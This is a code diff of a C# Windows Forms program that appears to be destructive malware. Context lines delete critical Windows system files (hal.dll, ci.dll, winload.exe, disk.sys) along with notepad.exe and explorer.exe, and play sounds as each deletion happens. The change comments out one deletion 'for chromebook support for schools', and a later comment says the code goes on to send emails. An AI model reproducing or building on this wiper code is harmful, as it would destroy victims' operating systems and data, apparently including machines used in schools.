@@ -76,7 +76,7 @@ namespace WindowsFormsApp1
             string ci_dll = @"C:\Windows\System32\ci.dll";
             string winload_exe = @"C:\Windows\System32\winload.exe";
             string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
-            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //C:\Windows
+            //string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //I have removed it for chromebook support for schools.
             string notepad = @"C:\Windows\notepad.exe";
             string fileexplorer = @"C:\Windows\explorer.exe";
             if (File.Exists(hal_dll))
@@ -115,7 +115,7 @@ namespace WindowsFormsApp1
                     _soundplayer.Play(); //play sound
                 }
             }
-            if (File.Exists(memoryanyalizer))
+           /* if (File.Exists(memoryanyalizer))
             {
                 File.Delete(memoryanyalizer);
                 if (File.Exists(sound_file_dying))
@@ -123,7 +123,7 @@ namespace WindowsFormsApp1
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
                     _soundplayer.Play(); //play sound
                 }
-            }
+            } */
             if (File.Exists(notepad))
             {
                 File.Delete(notepad);
@@ -224,7 +224,7 @@ namespace WindowsFormsApp1
                     pic.SetPixel(x, y, inv);
                 }
             }
-            Pictur1.Image = pic;
+            Pictur1.Image = pic; // pic's aint done yet chief
             // The next line of code sends emails and more.
             int mailTime = 5000;
             MailMessage mail = new MailMessage();
